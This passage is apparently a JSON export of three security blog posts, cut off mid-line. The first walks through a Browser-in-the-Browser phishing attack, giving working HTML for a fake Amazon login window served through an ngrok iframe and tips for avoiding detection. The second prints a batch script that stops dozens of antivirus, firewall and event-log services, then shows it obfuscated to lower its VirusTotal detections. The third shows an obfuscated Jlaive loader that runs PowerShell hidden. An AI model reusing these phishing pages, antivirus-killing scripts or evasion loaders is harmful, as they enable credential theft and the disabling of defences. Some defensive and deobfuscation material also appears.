[{"content":"What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.\nBasically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.\nHow does it work The way this attack works is that you host a phishing website, provide a login/signup page with usual platforms like \u0026ldquo;Continue with email\u0026rdquo;, \u0026ldquo;Continue with Facebook\u0026rdquo; etc and make the SSO window look legitimate (valid url) but the reality is that we will have control over that window to, because that window is fake as well.\nDemo To start off, we need to go to mr.d0x github page and get the template windows for this attack:\nhttps://github.com/mrd0x/BITB The files are just usual website files (html, css, js, icons). Example of a window before we modify it is the following: In the github repo, there are multiple templates based on the browser and the theme (dark / light). You need to know how the victim has configured his/her browser in order to use the right template so evade suspicions. You can either take a guess based on statistics (what is the most used theme) or write further code in the website to detect the theme and thus use the appropriate theme:\nhttps://stackoverflow.com/questions/50840168/how-to-detect-if-the-os-is-in-dark-mode-in-browsers Now that we have chosen a theme, let\u0026rsquo;s host a phishing website. I will go with blackeye one since I have made a post about it.\nWe first fire up our phishing website. It\u0026rsquo;s going to be an amazon one:\nAfterwards, we need to find the appropriate amazon.svg file and place it in the theme folder we are using. The final html page should be something like the following:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;window\u0026#34;\u0026gt; \u0026lt;!-- Title bar start --\u0026gt; \u0026lt;div id=\u0026#34;title-bar-width\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;title-bar\u0026#34;\u0026gt; \u0026lt;div style=\u0026#34;margin-top:5px;\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;./amazon.svg\u0026#34; width=\u0026#34;20px\u0026#34; height=\u0026#34;15px\u0026#34; id=\u0026#34;logo\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;logo-description\u0026#34;\u0026gt;Please log to your account.\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;span id=\u0026#34;minimize\u0026#34;\u0026gt;\u0026amp;#8212;\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;square\u0026#34;\u0026gt;□\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;exit\u0026#34;\u0026gt;✕\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;url-bar\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;./ssl.svg\u0026#34; width=\u0026#34;20px\u0026#34; height=\u0026#34;20px\u0026#34; id=\u0026#34;ssl-padlock\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;domain-name\u0026#34;\u0026gt;https://www.amazon.com\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;domain-path\u0026#34;\u0026gt;/signin.html\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- Content start --\u0026gt; \u0026lt;iframe id=\u0026#34;content\u0026#34; src=\u0026#34;https://44e5-46-177-73-144.ngrok-free.app\u0026#34; frameBorder=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script src=\u0026#34;script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; The victim should now see the following window, which seems legitimate: Upon entering the credentials, we should see them in our server: We could also write code to forward the user to the real login of the website we mimiced and pass the given creds as parameters to avoid further suspicion.\nDefenses The way this attack was initially detected was by trying to drag the SSO window out of the browser window. If the SSO window was not able to escape the outter window, this meant that it was fake.\nLater on, a plugin came out that would identify such windows by the use of their iframes and warn users about this attack. This is done with a technique known as frame busting, a technique now used by most of the known browsers. This leads to BitB being heavily detected and can burn your phishing domain. In order to avoid BitB being detected, you must somehow heavily obfuscate/hide it.\nSo if we somehow managed to solve the defense mechanism that checks for iframes, we would have a successful BitB phishing attack, which brings us to the next section on how to implement this attack without iframes and with the help of evilginx.\nBitB without iframes In this technique, apache and evilginx is utilized alongside with many css and html tricks, avoiding the use of iframes and thus making a more complicated (\u0026ldquo;obfuscated\u0026rdquo;) approach that is not that easy to detect. As the developer of this developed technique stated in his github repo: Framebusters target iframes specifically, so the idea is to create the BITB effect without the use of iframes, and without disrupting the original structure/content of the proxied page. This can be achieved by injecting scripts and HTML besides the original content using search and replace (aka substitutions), then relying completely on HTML/CSS/JS tricks to make the visual effect. We also use an additional trick called \u0026ldquo;Shadow DOM\u0026rdquo; in HTML to place the content of the landing page (background) in such a way that it does not interfere with the proxied content, allowing us to flexibly use any landing page with minor additional JS scripts.\nThe result is a fully working, undetected to framebusters SSO window using the bitb technique:\nThere are many things going on in frameless BitB but Wael Masri does a great job explaining the ins and outs of this technique and how you could replicate it:\nReferences\n[1] Mr.d0x: Browser In The Browser (BITB) Attack [2] Cofense email security: Browser-in-the-Browser (BitB) Attack Takes Advantage of Single-Sign-On Trust [3] Infinite Logins: Browser in the Browser (BITB) Phishing Technique [3] Wael Masri: How To: Evilginx + BITB | Browser In The Browser without iframes in 2024 [4] waelmas: frameless-bitb ","permalink":"http://localhost:1313/posts/bitb/","summary":"What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.\nBasically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.","title":"Browser-in-the-Browser (BitB) attack"},{"content":"What is the BatchEncryption tool The BatchEncryption tool is a tool used for obfuscating batch files. It is rather one of the most uncommon ones since it combines known and custom environment variable encodings to obfuscate the script. The way it works is it sets a randomly generated dictionary into a custom envar which is just a single quote (\u0026quot;\u0026rsquo;\u0026quot;). It then encodes it with existing environment variable substrings and then takes the remainder of the command using substrings of the custom environment variable declared previously.\nThe use of this tool was seen back in 2017 in the Jawlan and Suriya.doc (SHA-256: 761483906b45fad51f3c7ab66b1534dee137e93a52816aa270bc97249acb56d0) and has almost unknown at the time, with only 3 google search results. Now it has started to pop up more (mainly in .cn forums).\nAn example of a batch file obfuscated with BatchEncryption can be seen below:\nThe nice thing about this tool is that still in this day, it manages to get low AV detection in VT. Let\u0026rsquo;s take a .bat sample that disables multiple different AV engines:\nset ii=ne set ywe=st set ury=t set iej=op set jt53=Syma set o6t=nor set lyd2=fee set h3d=ton set gf45=ntec set own5=McA net stop \u0026#34;Security Center\u0026#34; /y net stop \u0026#34;Automatic Updates\u0026#34; /y net stop \u0026#34;Symantec Core LC\u0026#34; /y net stop \u0026#34;SAVScan\u0026#34; /y net stop \u0026#34;norton AntiVirus Firewall Monitor Service\u0026#34; /y net stop \u0026#34;norton AntiVirus Auto-Protect Service\u0026#34; /y net stop \u0026#34;norton AntiVirus Auto Protect Service\u0026#34; /y net stop \u0026#34;McAfee Spamkiller Server\u0026#34; /y net stop \u0026#34;McAfee Personal Firewall Service\u0026#34; /y net stop \u0026#34;McAfee SecurityCenter Update Manager\u0026#34; /y net stop \u0026#34;Symantec SPBBCSvc\u0026#34; /y cls net stop \u0026#34;Ahnlab Task Scheduler\u0026#34; /y net stop navapsvc /y net stop \u0026#34;Sygate Personal Firewall Pro\u0026#34; /y net stop vrmonsvc /y net stop MonSvcNT /y net stop SAVScan /y net stop NProtectService /y net stop ccSetMGR /y net stop ccEvtMGR /y net stop srservice /y net stop \u0026#34;Symantec Network Drivers Service\u0026#34; /y net stop \u0026#34;norton Unerase Protection\u0026#34; /y net stop MskService /y net stop MpfService /y net stop mcupdmgr.exe /y net stop \u0026#34;McAfeeAntiSpyware\u0026#34; /y net stop helpsvc /y net stop ERSvc /y net stop \u0026#34;*norton*\u0026#34; /y net stop \u0026#34;*Symantec*\u0026#34; /y net stop \u0026#34;*McAfee*\u0026#34; /y cls net stop ccPwdSvc /y net stop \u0026#34;Symantec Core LC\u0026#34; /y net stop navapsvc /y net stop \u0026#34;Serv-U\u0026#34; /y net stop \u0026#34;norton AntiVirus Auto Protect Service\u0026#34; /y net stop \u0026#34;norton AntiVirus Client\u0026#34; /y net stop \u0026#34;Symantec AntiVirus Client\u0026#34; /y net stop \u0026#34;norton AntiVirus Server\u0026#34; /y net stop \u0026#34;NAV Alert\u0026#34; /y net stop \u0026#34;Nav Auto-Protect\u0026#34; /y cls net stop \u0026#34;McShield\u0026#34; /y net stop \u0026#34;DefWatch\u0026#34; /y net stop eventlog /y net stop InoRPC /y net stop InoRT /y net stop InoTask /y cls net stop \u0026#34;norton AntiVirus Auto Protect Service\u0026#34; /y net stop \u0026#34;norton AntiVirus Client\u0026#34; /y net stop \u0026#34;norton AntiVirus Corporate Edition\u0026#34; /y net stop \u0026#34;ViRobot Professional Monitoring\u0026#34; /y net stop \u0026#34;PC-cillin Personal Firewall\u0026#34; /y net stop \u0026#34;Trend Micro Proxy Service\u0026#34; /y net stop \u0026#34;Trend NT Realtime Service\u0026#34; /y net stop \u0026#34;McAfee.com McShield\u0026#34; /y net stop \u0026#34;McAfee.com VirusScan Online Realtime Engine\u0026#34; /y net stop \u0026#34;SyGateService\u0026#34; /y net stop \u0026#34;Sygate Personal Firewall Pro\u0026#34; /y cls net stop \u0026#34;Sophos Anti-Virus\u0026#34; /y net stop \u0026#34;Sophos Anti-Virus Network\u0026#34; /y net stop \u0026#34;eTrust Antivirus Job Server\u0026#34; /y net stop \u0026#34;eTrust Antivirus Realtime Server\u0026#34; /y net stop \u0026#34;Sygate Personal Firewall Pro\u0026#34; /y net stop \u0026#34;eTrust Antivirus RPC Server\u0026#34; /y cls net stop netsvcs net stop spoolnt The VT result of this is the following:\n(I got to admin I was expecting more).\nNow let\u0026rsquo;s use the BatchEncryption tool to obfuscate our sample and load it again: In just a text editor we can\u0026rsquo;t really see what\u0026rsquo;s going on because of the encoding used, but if we load it for example in cyberchef, it gets converted to utf8 and thus we can see readable chars. Anyways, we can see that indeed a lot of stuff is going on. Custom, existing envars, caret symbol for extra obfuscation etc. We also notice a header on top, which is the author of the program (gwsbhqt@163.com). Let\u0026rsquo;s load it to VT and watch what happens:\nWe successfully reduced our results to only 3! For any of you wondering what would happen if we had removed the header of the author and load it again, it would give the same results.\nLet\u0026rsquo;s now see how we can deobfuscate samples obfuscated with this technique.\nBatch-Encryption-DeCoder Luckily for us, there is already a tool for this purpose, which can be found here:\nhttps://github.com/cnHopeStudio/Batch-Encryption-DeCoder We need to build this tool to get the final executable, which when run, gives us the original batch file:\nReferences\n[1] blackhat: Exploring the Depths\rof Cmd.exe Obfuscation and Detection Techniques\r[2] Amit: Recipient batch processing documents confused by BatchEncryption (version 201610)\r[3] gwsbhqt: [Original Tool][201610]BatchEncryption-BatchEncrying Encryption\r","permalink":"http://localhost:1313/posts/batchencryption/","summary":"What is the BatchEncryption tool The BatchEncryption tool is a tool used for obfuscating batch files. It is rather one of the most uncommon ones since it combines known and custom environment variable encodings to obfuscate the script. The way it works is it sets a randomly generated dictionary into a custom envar which is just a single quote (\u0026quot;\u0026rsquo;\u0026quot;). It then encodes it with existing environment variable substrings and then takes the remainder of the command using substrings of the custom environment variable declared previously.","title":"Exploring the BatchEncryption tool (and its deobfuscator) by gwsbhqt@163.com "},{"content":"What will this post be about This post will be about the Jlaive and Get-UnJlaive tools. I will not go into depth as there are other resources I will list that do a great job explaining more in depth of the ins and outs of these tools. This will just be an overview of the tools: How to obfuscate an executable with Jlaive and how to recover it using Get-UnJlaive.\nWhat is the Jlaive tool In short terms, Jlaive is a tool used to convert executables to undetectable .bat scripts for AV evasion. This tool is very similar to the well known BatCloak engine which was used to create such undetectable .bat scripts. As the scmagazine states \u0026hellip;Researchers tie BatCloak closely to another, now abandoned, BAT obfuscation tool called Jlaive\u0026hellip;Trend Micro said that the BatCloak engine is the core engine of Jlaive’s obfuscation algorithm, now repurposed. The BatCloak functionality is specifically tied to the instructions “LineObfuscation.cs and FileObfuscation.cs” used in the Jlaive crimeware.\nThere are many tools with similar goals, like the ScrubCrypt, but they are closed-source for better monetization and avoide the use of them from other cyber criminal groups. Anyway, lucky for us, we got a hold of the Jlaive tool and we are going to explore it in a simple poc executable.\nSimple poc The poc is nothing more than a MsgBox:\nusing System; using System.Collections.Generic; using System.Linq; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace pocHello { internal class Program { static void Main(string[] args) { MessageBox.Show(\u0026#34;just an msgbox as a poc\u0026#34;, \u0026#34;Message Box POC\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Information); } } } After building the project, we simply run the tool and load our executable, choosing what features we would like the obfuscated .bat file to have:\nRunning the tool, we get a successful message:\nNavigating to the path where the .bat file was created, we are met with the following code:\n@echo off echo F|xcopy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \u0026#34;%~dp0%~nx0.exe\u0026#34; /y attrib +s +h \u0026#34;%~dp0%~nx0.exe\u0026#34; cls cd %~dp0 set \u0026#34;fENYbyZJkq=3IHsgcHVib\u0026#34; set \u0026#34;oMDpdCkaMN=k = [Syste\u0026#34; set \u0026#34;HlBoTjvPwk=6UdLqADvWw\u0026#34; \u0026amp;\u0026amp; set \u0026#34;TgmwRYHkmK=ucHV0Lkxlb\u0026#34; set \u0026#34;nVaFdaubIS=npolicy by\u0026#34; \u0026amp;\u0026amp; set \u0026#34;BIXBCNceka=gSUNyeXB0b\u0026#34; \u0026amp;\u0026amp; set \u0026#34;YNWXZHqJqc=gZ3MuRGlzc\u0026#34; set \u0026#34;tQIzxvQESC=GtleSwgYnl\u0026#34; \u0026amp;\u0026amp; set \u0026#34;XOhAfBkWmm=vert]::Fro\u0026#34; set \u0026#34;kLMTZqURfX=U), [Syste\u0026#34; \u0026amp;\u0026amp; set \u0026#34;qVRmUESgbg=$tIukXz = \u0026#34; \u0026amp;\u0026amp; set \u0026#34;saTMAKUycO=SBpbnB1dCw\u0026#34; \u0026amp;\u0026amp; set \u0026#34;KdmMRlyyEK=nlwdG9yLlR\u0026#34; \u0026amp;\u0026amp; set \u0026#34;PMyINOXuEO=GJ5dGVbXSB\u0026#34; set \u0026#34;FscnzUUuAC=::FromBase\u0026#34; set \u0026#34;BARCwvwdkW=-noprofile\u0026#34; \u0026amp;\u0026amp; set \u0026#34;vwRxWzGiFE=))).EntryP\u0026#34; set \u0026#34;sMNjHgEuTS=md0aCk7IGR\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ZMFfhtZaCd=n $tIukXz;\u0026#34; \u0026amp;\u0026amp; set \u0026#34;NRBHbUNrkG=etString([\u0026#34; \u0026amp;\u0026amp; set \u0026#34;tNCgPVjCku=kID0gZGVjc\u0026#34; set \u0026#34;CDtNvqDvqL=ngth - 1];\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ieHoPTyjEy=mBase64Str\u0026#34; \u0026amp;\u0026amp; set \u0026#34;rajcuUaXTP=m.IO.File]\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ihrpBFSJkF=Gh5OyBwdWJ\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ObqwUWcIse=yZXR1cm4gb\u0026#34; set \u0026#34;wrxnxJJZUi=10gY1VaaUJ\u0026#34; set \u0026#34;tPPsLfEmfH=ssembly]::\u0026#34; \u0026amp;\u0026amp; set \u0026#34;wYpmPrqEes=0ZW0uU2Vjd\u0026#34; \u0026amp;\u0026amp; set \u0026#34;PeMJlFunvD=%~nx0.exe \u0026#34; \u0026amp;\u0026amp; set \u0026#34;xRRkIyDKnV=GUgPSBDaXB\u0026#34; set \u0026#34;LguDwtEgTm=ing(\u0026#39;dXNpb\u0026#34; set \u0026#34;rBnjvHzCEC=SwgaXYpOyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;BwxNyGNeWs=and $NDmNb\u0026#34; \u0026amp;\u0026amp; set \u0026#34;NOLCAWkezL=XJpdHkuQ3J\u0026#34; \u0026amp;\u0026amp; set \u0026#34;JxakJbogEh=c212SWxpVX\u0026#34; set \u0026#34;avLgdUKvyf=System.Con\u0026#34; set \u0026#34;dzLmqrEuSn=Load([DuUJ\u0026#34; set \u0026#34;buYFlxnyag=mcgU3lzdGV\u0026#34; set \u0026#34;JrzOnKokrg=G8obXNvKTs\u0026#34; set \u0026#34;VKtWSAzekf=kaW5nTW9kZ\u0026#34; set \u0026#34;UDLwXXbfUO=eDefinitio\u0026#34; set \u0026#34;pZCqseAkqe=ext(\u0026#39;%~f0\u0026#39;).Split([Environment]::NewLine);$WWCkvU \u0026#34; set \u0026#34;bEuenIEGAB=ert]::From\u0026#34; set \u0026#34;evGNjFJkiq=::ReadAllT\u0026#34; set \u0026#34;EtpzUbnYkW=XRlRGVjcnl\u0026#34; set \u0026#34;rAJgHQskWM=3VzaW5nIFN\u0026#34; \u0026amp;\u0026amp; set \u0026#34;nUMBtoFYkK=yBNZW1vcnl\u0026#34; \u0026amp;\u0026amp; set \u0026#34;DlNUGnnsfJ=gTWVtb3J5U\u0026#34; \u0026amp;\u0026amp; set \u0026#34;tguYxsQeEG=hbmFnZWQgY\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ZxsoDXEAmh=::cUZiBs([\u0026#34; set \u0026#34;rrBdlEgEiR=\u0026#34; \u0026amp;\u0026amp; set \u0026#34;yuBNvyTjWG=ieXRlW10gZ\u0026#34; \u0026amp;\u0026amp; set \u0026#34;EpkleGpiSQ=zLlBhZGRpb\u0026#34; \u0026amp;\u0026amp; set \u0026#34;hlfUYJcbnE=//github.c\u0026#34; \u0026amp;\u0026amp; set \u0026#34;JaaFxTqmkm=zKGJ5dGVbX\u0026#34; set \u0026#34;ovxvfokepJ=yA9IG5ldyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;NdBkzRUyNc=-Type -Typ\u0026#34; set \u0026#34;cECnVddQIO=gYWVzLk1vZ\u0026#34; set \u0026#34;JYdzLMkAMI=zdGVtLklPO\u0026#34; set \u0026#34;LIJyjYDhEO=mBase64Str\u0026#34; set \u0026#34;FQDboAlVkm=0cmVhbSBtc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;CtISDxCuyg=$NDmNbk.Le\u0026#34; set \u0026#34;cPhgSHJFiE=laive\u0026#34; \u0026amp;\u0026amp; set \u0026#34;wOUbaaionW=8dQ=\u0026#39;), [S\u0026#34; set \u0026#34;TFqYzkUFKP=oZXJNb2RlL\u0026#34; \u0026amp;\u0026amp; set \u0026#34;XmJlbVCEeg=ybSBkZWNye\u0026#34; set \u0026#34;rsAojPyqqK=pass -comm\u0026#34; set \u0026#34;HjDUCECfuK=vY2soaW5wd\u0026#34; \u0026amp;\u0026amp; set \u0026#34;RLYjZdmUem=i5EaXNwb3N\u0026#34; set \u0026#34;JmcNfgjlkO=3IE1lbW9ye\u0026#34; set \u0026#34;wotBbJUCXp=28gPSBuZXc\u0026#34; set \u0026#34;ZMbsYBZiEq=S5QS0NTNzs\u0026#34; set \u0026#34;JWEGEWztyS=y5Db21wcmV\u0026#34; \u0026amp;\u0026amp; set \u0026#34;wYGjMTSRLU=G9zZSgpOyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;RZdMvuYUqn=tLlRleHQ7d\u0026#34; set \u0026#34;DDhHMvstEO=GljIHN0YXR\u0026#34; \u0026amp;\u0026amp; set \u0026#34;BLkZldvAHE=TdHJlYW0gb\u0026#34; \u0026amp;\u0026amp; set \u0026#34;HkRRYWZUWm=7IHZhciBnc\u0026#34; set \u0026#34;EvYPmaikjR=lY3J5cHRvc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;NUGvGuKfkH=]] (\u0026#39;%*\u0026#39;)))\u0026#34; \u0026amp;\u0026amp; set \u0026#34;TiPQaNUyEk=om/ch2sh/J\u0026#34; \u0026amp;\u0026amp; set \u0026#34;mMQdKSFyum=yeXB0ZWQ7I\u0026#34; set \u0026#34;FFeCIpqPyy= -windowst\u0026#34; set \u0026#34;lYRjpzjmyM=mcgPSBQYWR\u0026#34; \u0026amp;\u0026amp; set \u0026#34;jEdNSXkuFv=oint.Invok\u0026#34; set \u0026#34;UeVhkuMOtk=XNpID0gbmV\u0026#34; set \u0026#34;reZEtGxrSh=y5EaXNwb3N\u0026#34; \u0026amp;\u0026amp; set \u0026#34;uPqpbVZyku=ystem.Conv\u0026#34; \u0026amp;\u0026amp; set \u0026#34;QbZOQhYmgk=Fw]::YWqYu\u0026#34; set \u0026#34;ljXHtMvGyf=jIHN0YXRpY\u0026#34; \u0026amp;\u0026amp; set \u0026#34;LulfiaLhEe=XNpbmcgU3l\u0026#34; set \u0026#34;GVtjxQXtOo=zc2lvbjt1c\u0026#34; set \u0026#34;EyEeayRkCp=m.Convert]\u0026#34; \u0026amp;\u0026amp; set \u0026#34;VTmkqOOkQh=5c3RlbS5JT\u0026#34; set \u0026#34;DJZvlJxSeK=flection.A\u0026#34; set \u0026#34;VrbuAavxUi=XQsIDAsIGl\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ytnErceFKM=G9zZSgpOyB\u0026#34; set \u0026#34;WsBCQAkGPI=mFnZWQoKTs\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ZeKpegxEqf=UZpbmFsQmx\u0026#34; \u0026amp;\u0026amp; set \u0026#34;fYjkFWUCLu=e($null, (\u0026#34; \u0026amp;\u0026amp; set \u0026#34;qbrRUujXDM=lKCk7IGFlc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;TcbXekUkOV=Base64Stri\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ryOJrbkGXw=ncy5Db3B5V\u0026#34; \u0026amp;\u0026amp; set \u0026#34;gBhbYMmkar=HWmlwU3RyZ\u0026#34; set \u0026#34;xFXbUXSqiH=hZXMuQ3JlY\u0026#34; set \u0026#34;jUxqxtJWwK=XB0b3IgPSB\u0026#34; set \u0026#34;cUNiABJEPG=64String(\u0026#39;\u0026#34; set \u0026#34;BYliuSSkds=E1lbW9yeVN\u0026#34; set \u0026#34;DgsMJGRBkW=kNCQzsgYWV\u0026#34; \u0026amp;\u0026amp; set \u0026#34;yxMQSdikCf=System.Con\u0026#34; \u0026amp;\u0026amp; set \u0026#34;pqydlkWvlv=yYW5zZm9yb\u0026#34; set \u0026#34;xmGqfoyigz=yYXkoKTsgf\u0026#34; \u0026amp;\u0026amp; set \u0026#34;mKWZuiSqkG= -executio\u0026#34; set \u0026#34;pWisjkyuvo=g]::UTF8.G\u0026#34; \u0026amp;\u0026amp; set \u0026#34;RdergtMaPv=3MgRHVVSkZ\u0026#34; \u0026amp;\u0026amp; set \u0026#34;FoeUHvtBeI=3RyZWFtKCk\u0026#34; set \u0026#34;PtbWQSaxkP=gYnl0ZVtdI\u0026#34; \u0026amp;\u0026amp; set \u0026#34;prlyUalgGj=, [string[\u0026#34; \u0026amp;\u0026amp; set \u0026#34;qfhEOMrfue=rem https:\u0026#34; set \u0026#34;EHNuBdghke=XNvLlRvQXJ\u0026#34; set \u0026#34;atzklLZikC=ieXRlcyk7I\u0026#34; set \u0026#34;VzZHdHfnkK=wdG9yKGtle\u0026#34; \u0026amp;\u0026amp; set \u0026#34;pbEQoHEFya=3Npb25Nb2R\u0026#34; set \u0026#34;wyIRpJUzUy=ng(\u0026#39;i9gKth\u0026#34; set \u0026#34;aRvucOwBMK=lLkRlY29tc\u0026#34; set \u0026#34;ZGtoXTmqEa=vert]::Fro\u0026#34; \u0026amp;\u0026amp; set \u0026#34;LBXFmXrGGk=yle hidden\u0026#34; \u0026amp;\u0026amp; set \u0026#34;PgpYWgnESr=SB9\u0026#39;));Add\u0026#34; \u0026amp;\u0026amp; set \u0026#34;jQJlvwKnUC=HVybiBkZWN\u0026#34; set \u0026#34;yutyGaKptk=pYyBieXRlW\u0026#34; set \u0026#34;NrVzEyZKxJ=gWVdxWXVPK\u0026#34; set \u0026#34;ElUeqoZkeB=5cHRvZ3Jhc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;VqDUHkduHE=HJlc3MpOyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;bXuhcMQWEC=tc2kuRGlzc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;wIkgxuqwSU=ieXRlcykge\u0026#34; \u0026amp;\u0026amp; set \u0026#34;BeUppPecxE=xt.Encodin\u0026#34; \u0026amp;\u0026amp; set \u0026#34;JXrPZaVOUG=G9zZSgpOyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;FclUyvUGNa=WVzID0gbmV\u0026#34; \u0026amp;\u0026amp; set \u0026#34;QQwGKBkSYC=WS5VvlzyRn\u0026#34; \u0026amp;\u0026amp; set \u0026#34;QSDzwOfsqN=saWMgY2xhc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;nNEnadmgAy=SB7IEFlc01\u0026#34; set \u0026#34;ZSnQhDQxOJ=WFtKG1zaSw\u0026#34; set \u0026#34;hCSlczZEed=[System.Re\u0026#34; set \u0026#34;tAyNMEciUo=VN0cmVhbSh\u0026#34; \u0026amp;\u0026amp; set \u0026#34;lELXxFDard=O([DuUJFw]\u0026#34; set \u0026#34;nNsRHgWaoU== $NDmNbk[\u0026#34; set \u0026#34;ldbJMTqUaX=0ZVtdIGl2K\u0026#34; \u0026amp;\u0026amp; set \u0026#34;sSUxwkECwE=1RyYW5zZm9\u0026#34; \u0026amp;\u0026amp; set \u0026#34;IYUhcqkikI=1hMu1g==\u0026#39;)\u0026#34; set \u0026#34;rgNaXziIpC=GVjcnlwdGV\u0026#34; set \u0026#34;xdaAAuWEqb=3IEFlc01hb\u0026#34; \u0026amp;\u0026amp; set \u0026#34;TYDLSAjkyA=gQ29tcHJlc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;GgmonIEaZP=ing($WWCkv\u0026#34; set \u0026#34;IArsKCeeLv=tc28uRGlzc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;oLgiwxduaV=H0gcHVibGl\u0026#34; \u0026amp;\u0026amp; set \u0026#34;GNZxLtdDkO=[System.Te\u0026#34; set \u0026#34;amOerQZEai=OxhVVfEWSN\u0026#34; \u0026amp;\u0026amp; set \u0026#34;fHTMzMCrak=yBieXRlW10\u0026#34; set \u0026#34;kKopFOwikC=2luZyBTeXN\u0026#34; set \u0026#34;occQjttmnX=lKCk7IHJld\u0026#34; set \u0026#34;eZKAFlWkCV=MlVcdDTvXm\u0026#34; %qfhEOMrfue%%hlfUYJcbnE%%TiPQaNUyEk%%cPhgSHJFiE% %PeMJlFunvD%%BARCwvwdkW%%FFeCIpqPyy%%LBXFmXrGGk%%mKWZuiSqkG%%nVaFdaubIS%%rsAojPyqqK%%BwxNyGNeWs%%oMDpdCkaMN%%rajcuUaXTP%%evGNjFJkiq%%pZCqseAkqe%%nNsRHgWaoU%%CtISDxCuyg%%CDtNvqDvqL%%qVRmUESgbg%%GNZxLtdDkO%%BeUppPecxE%%pWisjkyuvo%%NRBHbUNrkG%%avLgdUKvyf%%ZGtoXTmqEa%%LIJyjYDhEO%%LguDwtEgTm%%buYFlxnyag%%RZdMvuYUqn%%LulfiaLhEe%%JYdzLMkAMI%%rAJgHQskWM%%VTmkqOOkQh%%JWEGEWztyS%%GVtjxQXtOo%%kKopFOwikC%%wYpmPrqEes%%NOLCAWkezL%%ElUeqoZkeB%%ihrpBFSJkF%%QSDzwOfsqN%%RdergtMaPv%%fENYbyZJkq%%DDhHMvstEO%%yutyGaKptk%%wrxnxJJZUi%%JaaFxTqmkm%%saTMAKUycO%%PtbWQSaxkP%%tQIzxvQESC%%ldbJMTqUaX%%nNEnadmgAy%%tguYxsQeEG%%FclUyvUGNa%%xdaAAuWEqb%%WsBCQAkGPI%%cECnVddQIO%%xRRkIyDKnV%%TFqYzkUFKP%%DgsMJGRBkW%%EpkleGpiSQ%%lYRjpzjmyM%%VKtWSAzekf%%ZMbsYBZiEq%%BIXBCNceka%%sSUxwkECwE%%XmJlbVCEeg%%jUxqxtJWwK%%xFXbUXSqiH%%EtpzUbnYkW%%VzZHdHfnkK%%rBnjvHzCEC%%yuBNvyTjWG%%rgNaXziIpC%%tNCgPVjCku%%KdmMRlyyEK%%pqydlkWvlv%%ZeKpegxEqf%%HjDUCECfuK%%VrbuAavxUi%%TgmwRYHkmK%%sMNjHgEuTS%%EvYPmaikjR%%RLYjZdmUem%%qbrRUujXDM%%reZEtGxrSh%%occQjttmnX%%jQJlvwKnUC%%mMQdKSFyum%%oLgiwxduaV%%ljXHtMvGyf%%fHTMzMCrak%%NrVzEyZKxJ%%PMyINOXuEO%%wIkgxuqwSU%%nUMBtoFYkK%%BLkZldvAHE%%UeVhkuMOtk%%JmcNfgjlkO%%tAyNMEciUo%%atzklLZikC%%BYliuSSkds%%FQDboAlVkm%%wotBbJUCXp%%DlNUGnnsfJ%%FoeUHvtBeI%%HkRRYWZUWm%%ovxvfokepJ%%gBhbYMmkar%%ZSnQhDQxOJ%%TYDLSAjkyA%%pbEQoHEFya%%aRvucOwBMK%%VqDUHkduHE%%ryOJrbkGXw%%JrzOnKokrg%%YNWXZHqJqc%%JXrPZaVOUG%%bXuhcMQWEC%%wYGjMTSRLU%%IArsKCeeLv%%ytnErceFKM%%ObqwU